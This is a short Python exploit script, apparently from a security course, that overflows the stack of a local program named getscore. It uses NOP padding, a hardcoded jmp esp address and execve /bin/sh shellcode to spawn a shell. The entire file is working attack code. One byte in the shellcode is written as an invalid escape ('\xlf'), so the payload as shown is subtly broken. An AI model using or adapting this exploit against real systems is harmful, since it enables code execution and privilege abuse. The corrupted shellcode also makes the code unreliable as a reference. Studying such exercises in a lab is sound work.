import os
import struct

## converts address of jmp esp using function from struct package 
addr = struct.pack('<L', 0x42122ba7)

## uses shellcode provided in slides
shellcode = ("\xeb\xlf\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh")

## 136 is the offset calculated by subtracting the starting address 
## of the overflow from the address of the $esp pointer 
payload = ("\x90" * 136) + addr + shellcode

run_command = "./getscore aaa " + payload

## runs the getscore programm with arguments aaa
## and the payload calculated above to overflow the stack
## and and insert the shellcode so the getscore program runs that instead
os.system(run_command)